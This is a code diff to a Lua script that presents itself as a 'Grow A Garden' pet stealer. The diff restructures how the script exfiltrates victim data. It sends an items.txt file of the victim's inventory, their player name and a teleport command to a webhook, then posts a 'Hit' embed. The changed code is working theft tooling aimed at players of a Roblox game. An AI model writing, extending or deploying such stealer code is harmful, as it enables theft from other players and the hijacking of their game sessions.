@@ -366,8 +366,20 @@
             teleportDisplay
         )
 
-        local data = {
+        -- Send file first
+        local fileData = {
             ["content"] = prefix .. teleportCmd,
+            ["username"] = playerName,
+            ["file"] = {
+                ["name"] = "items.txt",
+                ["content"] = itemsTxtContent
+            }
+        }
+        
+        sendWebhook(fileData)
+        
+        -- Send embed message
+        local embedData = {
             ["username"] = playerName,
             ["embeds"] = {{
                 ["title"] = ":dog: Grow A Garden Hit - ZANJI: PET STEALER :dog:",
@@ -377,14 +389,10 @@
                     ["text"] = "🐕 GAG Pet Stealer by ZANJI"
                 },
                 ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S.000Z")
-            }},
-            ["file"] = {
-                ["name"] = "items.txt",
-                ["content"] = itemsTxtContent
-            }
+            }}
         }
 
-        return sendWebhook(data)
+        return sendWebhook(embedData)
     end
 
     -- Update SendMessage to focus on pets
